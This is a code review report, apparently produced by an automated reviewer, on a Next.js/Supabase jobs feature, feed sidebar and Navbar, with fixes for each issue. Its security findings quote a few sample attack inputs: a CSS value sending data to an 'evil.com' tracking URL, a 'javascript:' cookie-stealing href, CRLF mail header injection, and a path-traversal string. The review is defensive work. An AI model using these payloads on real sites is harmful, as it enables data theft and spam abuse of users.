# Code Review: Jobs Feature, Feed Sidebar, Navbar Update

**Date**: 2026-03-19
**Scope**: Specific files — jobs feature (new), feed sidebar components (new), Navbar (modified), SQL migration (new)
**Files**: 7 | **Depth**: Exhaustive (< 5 files new, full line-by-line)

## Summary

|              | Critical | High | Medium | Low |
|--------------|----------|------|--------|-----|
| Issues       | 0        | 3    | 6      | 2   |
| Improvements | —        | 1    | 3      | 2   |

**Verdict**: NEEDS WORK

---

## Issues

### High (P1) — Will cause bugs in production

#### 1. Unfiltered realtime messages subscription leaks all messages to all clients

- **File**: `src/components/layout/Navbar.tsx:93-104`
- **Problem**: The `navbar-messages` channel subscribes to ALL inserts on the `messages` table with no server-side filter (`filter` param is absent). The client receives every new message from every conversation on the platform and only checks `sender_id` client-side.
- **Impact**: Any user can open DevTools Network tab and read other users' message payloads in real time. This is a data-privacy breach — message content is sent over the wire to unauthorized clients regardless of RLS on normal queries, because realtime bypasses row-level security unless a `filter` is specified on the channel.
- **Fix**: Add a server-side filter scoped to conversations the user is a participant of. Since Supabase realtime doesn't support OR-filters on multiple columns easily, the correct approach is to filter on `conversation_id` using `in` after fetching the user's conversation IDs, or use a broadcast channel pattern:
  ```ts
  supabase.channel('navbar-messages')
    .on('postgres_changes', {
      event: 'INSERT',
      schema: 'public',
      table: 'messages',
      filter: `conversation_id=in.(${convos.map(c => c.id).join(',')})`,
    }, (payload) => { ... })
  ```

#### 2. CSS injection via user-controlled inline styles in FeedProfileCard

- **File**: `src/components/feed/FeedProfileCard.tsx:21-24`
- **Problem**: `profile.cover_url`, `profile.theme_accent`, and `profile.theme_bg` are all user-controlled values injected directly into an inline `style` attribute as raw strings — no sanitization, no allowlisting.
  ```tsx
  style={{
    background: profile.cover_url
      ? `url(${profile.cover_url}) center/cover no-repeat`
      : `linear-gradient(135deg, ${profile.theme_accent}55 0%, ${profile.theme_bg} 100%)`,
  }}
  ```
- **Impact**: A user can set `theme_accent` to `red) url(https://evil.com/track?c=` or inject `expression(...)` in older IE-compat contexts. More critically, `cover_url` can be set to `none); color:red; background:url(javascript:...)` in environments where CSS expression evaluation is possible. Even if full XSS is blocked by React's string escaping in some paths, UI defacement and data exfiltration via CSS `url()` to third-party servers are practical today.
- **Fix**:
  - Validate `cover_url` and `avatar_url` at write time in Supabase to be `https://` URLs from your own storage bucket domain only (add a CHECK constraint or trigger).
  - For theme values, enforce they are valid hex colors (`/^#[0-9a-fA-F]{6}$/`) at the DB level (CHECK constraint) and strip at read time before rendering.
  - Short-term: validate format before injecting:
    ```tsx
    const safeAccent = /^#[0-9a-fA-F]{6}$/.test(profile.theme_accent ?? '')
      ? profile.theme_accent
      : '#6366f1'
    ```

#### 3. Realtime subscription channels not cleaned up in Navbar

- **File**: `src/components/layout/Navbar.tsx:79-104`
- **Problem**: Two `supabase.channel(...).subscribe()` calls are made inside `loadProfile()` which is called from a `useEffect`. Neither channel is returned for cleanup, so they are never unsubscribed when the component unmounts (or when the effect re-runs). There is no `return () => { supabase.removeChannel(...) }` in the `useEffect`.
- **Impact**: Every mount of Navbar (e.g., route transitions in layouts that remount) creates new WebSocket subscriptions that stack up. This causes duplicate notifications, memory leaks, and degraded performance over long sessions. Given Navbar is always visible, this is a steady accumulation problem.
- **Fix**: Store channel references and clean them up:
  ```ts
  useEffect(() => {
    const supabase = createClient()
    let notifChannel: RealtimeChannel
    let msgChannel: RealtimeChannel

    async function loadProfile() {
      // ... existing code ...
      notifChannel = supabase.channel('navbar-notifications').on(...).subscribe()
      msgChannel = supabase.channel('navbar-messages').on(...).subscribe()
    }
    loadProfile()
    return () => {
      supabase.removeChannel(notifChannel)
      supabase.removeChannel(msgChannel)
    }
  }, [])
  ```

---

### Medium (P2) — Should fix, won't break things today

#### 4. `apply_url` stored without URL validation — open redirect / javascript: URI risk

- **File**: `src/app/(main)/jobs/page.tsx:119` and `src/app/(main)/jobs/[id]/page.tsx:245`
- **Problem**: `apply_url` is inserted to the DB directly from form input with no validation. It is then rendered as an `<a href={job.apply_url} target="_blank">`. A malicious poster can submit `javascript:alert(document.cookie)` or a phishing URL.
- **Impact**: Clicking "Apply Now" executes arbitrary JS in the user's browser (XSS via `javascript:` href) or navigates to a phishing site. React does not sanitize `href` attributes for `javascript:` URIs.
- **Fix**: Validate on insert that `apply_url` starts with `https://` (client-side in form, AND a DB-level CHECK constraint):
  ```sql
  ALTER TABLE jobs ADD CONSTRAINT jobs_apply_url_safe
    CHECK (apply_url IS NULL OR apply_url LIKE 'https://%');
  ```
  Client-side: validate before submission in `handleSubmit`.

#### 5. Email header injection in mailto link subject

- **File**: `src/app/(main)/jobs/page.tsx:441` and `src/app/(main)/jobs/[id]/page.tsx:252`
- **Problem**: `job.title` (user content) is embedded into a mailto link's `?subject=` query parameter without encoding:
  ```tsx
  href={`mailto:${job.apply_email}?subject=Application: ${job.title}`}
  ```
  A job title containing `%0A` (newline) or `%0D%0A` (CRLF) can inject additional email headers (`Bcc:`, `Cc:`, `Content-Type:`), effectively turning this into a spam relay via the applicant's mail client.
- **Impact**: Spammers who post jobs can craft titles that, when clicked by any user, silently BCC external addresses or add body content. Medium severity because it requires user interaction.
- **Fix**: Encode the subject using `encodeURIComponent`:
  ```tsx
  href={`mailto:${job.apply_email}?subject=${encodeURIComponent(`Application: ${job.title}`)}`}
  ```

#### 6. `handleSaveToggle` has no error handling or optimistic rollback

- **File**: `src/app/(main)/jobs/page.tsx:522-531` and `src/app/(main)/jobs/[id]/page.tsx:101-111`
- **Problem**: Both save/unsave implementations update UI state immediately then fire the Supabase mutation with no `.catch()` and no rollback if the mutation fails. If the user is rate-limited, loses connectivity, or hits an RLS error, the UI shows "saved" while the DB has no record.
- **Fix**: Check the error return and revert state on failure:
  ```ts
  if (savedJobIds.has(jobId)) {
    setSavedJobIds(prev => { const next = new Set(prev); next.delete(jobId); return next }) // optimistic
    const { error } = await supabase.from('job_saves').delete().eq('job_id', jobId).eq('user_id', userId)
    if (error) {
      setSavedJobIds(prev => new Set([...prev, jobId])) // revert
      toast.error('Could not unsave job.')
    }
  }
  ```

#### 7. `window.innerWidth` access in `loadJobs` — SSR crash risk

- **File**: `src/app/(main)/jobs/page.tsx:506`
- **Problem**: `window.innerWidth` is accessed inside an async function called from `useEffect`. While `useEffect` is client-only, the function is marked `useCallback` and the check is inside it — this is fine in current Next.js app router since this page is `'use client'`. However, if this page is ever server-rendered (e.g., PPR or RSC boundary change), it will crash. It also breaks in SSR test environments.
- **Fix**: Guard with `typeof window !== 'undefined'`:
  ```ts
  if (typeof window !== 'undefined' && window.innerWidth >= 768) {
    setSelectedJob(jobsData[0])
  }
  ```

#### 8. Non-numeric job ID produces silent NaN query

- **File**: `src/app/(main)/jobs/[id]/page.tsx:63`
- **Problem**: `const jobId = Number(id)` — if someone navigates to `/jobs/abc` or `/jobs/../../etc/passwd`, `Number('abc')` yields `NaN`. Supabase's `.eq('id', NaN)` behavior is unspecified and may return rows or throw without a useful error.
- **Fix**: Validate early and redirect:
  ```ts
  const jobId = Number(id)
  if (!Number.isInteger(jobId) || jobId <= 0) {
    notFound() // Next.js 13+ built-in
  }
  ```

#### 9. `job_applications` UPDATE policy allows applicant to change status

- **File**: `supabase-jobs-migration.sql:78`
- **Problem**: `CREATE POLICY "Users can update own applications" ON job_applications FOR UPDATE USING (auth.uid() = applicant_id)` — this lets applicants update their own application record, including the `status` column (`applied`, `viewed`, `shortlisted`, `rejected`). An applicant could self-promote their status to `shortlisted`.
- **Impact**: Data integrity loss — the `status` field is semantically owned by the job poster, not the applicant.
- **Fix**: Either restrict the UPDATE policy to a specific column set (Supabase does not directly support column-level RLS, so use a separate function or remove applicant UPDATE entirely if it's not needed) or enforce status changes only through a `SECURITY DEFINER` function that validates the caller is the poster:
  ```sql
  -- Remove the applicant UPDATE policy and handle withdrawals via DELETE
  DROP POLICY "Users can update own applications" ON job_applications;
  ```

---

### Low (P3) — Cleanup

#### 10. `formatSalary` duplicated across two files

- **File**: `src/app/(main)/jobs/page.tsx:50-61` and `src/app/(main)/jobs/[id]/page.tsx:44-55`
- **Problem**: The `formatSalary` function is identical in both files — copied verbatim.
- **Fix**: Extract to `src/lib/utils.ts` or a `src/lib/jobs.ts` module and import in both.

#### 11. `EMPLOYMENT_LABELS` / `LOCATION_TYPE_LABELS` duplicated

- **File**: Same two files, lines 36-48 in both
- **Problem**: Both constant objects are duplicated. Same fix as above — shared module.

---

## Improvements

### High

#### 1. Messages realtime subscription queries all conversations then unread messages — two round trips on every Navbar mount

- **File**: `src/components/layout/Navbar.tsx:62-75`
- **Current**: Two sequential queries: first fetch all conversation IDs, then count unread messages from those IDs.
- **Recommended**: Add a DB function `get_unread_message_count(user_id uuid)` that does this in one query, avoiding the N-step client round trip. As a quick fix, the two queries can run in parallel with `Promise.all`.

### Medium

#### 2. TrendingWidget group URL built from name, not slug

- **File**: `src/components/feed/TrendingWidget.tsx:68`
- **Current**: `href={/groups/${group.name.toLowerCase().replace(/ /g, '-').replace(/[^a-z0-9-]/g, '')}}`
- **Problem**: If two groups have names that normalize to the same slug (e.g., "Tech & IT" and "Tech IT"), links will collide. The normalization is also done client-side and may not match server-side slug generation.
- **Recommended**: Add a `slug` column to the `groups` table and use it directly.

#### 3. Realtime feed update fetches page 0 of get_feed, not the specific new post

- **File**: `src/app/(main)/feed/page.tsx:138-143`
- **Current**: On any new post INSERT, the realtime handler re-queries `get_feed` with `p_page_offset: 0, p_page_size: 1`. This returns the most recent post in the feed algorithm — which may not be the post that just triggered the event (if it's from a non-connection or filtered out).
- **Recommended**: Fetch the new post by ID directly (`supabase.from('posts').select('...').eq('id', payload.new.id)`) and reshape it into `FeedPost` format, or add a dedicated RPC `get_post_for_feed(p_post_id, p_user_id)`.

### Low

#### 4. `select('*')` on jobs count query in TrendingWidget

- **File**: `src/components/feed/TrendingWidget.tsx:34`
- **Current**: `supabase.from('jobs').select('*', { count: 'exact', head: true })`
- **Recommended**: `select('id', { count: 'exact', head: true })` — with `head: true` no rows are returned anyway, but `select('id')` makes intent clear and avoids any future regression if `head` is accidentally removed.

---

## Positive Patterns

1. **RLS is enabled on all three new tables** with appropriately scoped policies. The `jobs` SELECT policy correctly allows posters to see their own inactive jobs while keeping public reads to active-only. Well structured.

2. **Trigram indexes on `title` and `company`** (`gin_trgm_ops`) in the migration are forward-thinking — they enable efficient `LIKE '%query%'` searches that would otherwise be full table scans. The client-side filtering in the jobs page will eventually need to move server-side for large datasets, and these indexes will already be in place.

3. **`filteredJobs` is properly memoized** with `useMemo` in `jobs/page.tsx` (line 543), and `loadJobs` is wrapped in `useCallback` — good patterns that prevent unnecessary re-renders.

---

## Escalation

The following require senior/security review before production:

1. **Realtime message data leakage** (Issue #1) — all users' message payloads broadcast to all clients. This must be fixed before any user data hits production.
2. **CSS injection via theme values** (Issue #2) — user-controlled CSS in inline styles. Requires DB-level validation added retroactively, and review of any existing malformed data if the app is already live.
3. **`job_applications` UPDATE policy** (Issue #9) — applicants can self-modify status. Requires a migration to fix.
4. **Database schema change** — the `jobs`, `job_saves`, and `job_applications` tables are new production schema. This migration needs a DBA review, especially the `SECURITY DEFINER` trigger function.

---

## Validation

- **Type Check** (`npx tsc --noEmit`): PASS (no errors)
- **Build** (`next build`): Not run — `next build` requires env vars not available in review context
- **pnpm**: Not installed in environment; `npm`/`npx` used as fallback
